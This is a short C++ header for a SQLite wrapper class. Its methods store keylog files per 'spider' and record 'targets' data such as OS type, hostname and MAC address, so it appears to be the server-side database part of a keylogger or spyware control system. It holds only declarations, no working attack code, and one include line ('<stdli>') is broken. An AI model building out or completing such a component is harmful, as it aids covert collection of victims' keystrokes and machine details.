#pragma once
#include <string>
#include <iostream>
#include <exception>
#include <sqlite3.h>
#include <time.h>
#include <stdli>

#define OPEN_ERR "sqlite3: error on opening"

class DB_SQLite {
public:
	DB_SQLite();
	~DB_SQLite();

	bool exec(std::string const& cmd);
	bool init(std::string const& file);
	bool add_keylogfiles(int id_spider, std::string date, const char *file, int filesize);
	bool add_targetsdata(int id_spider, std::string const& ostype, std::string const& hostname, std::string const& dotnet, std::string const& mac_addr);
private:
	sqlite3 *_dbHandler;
	sqlite3_stmt *_stmt;
};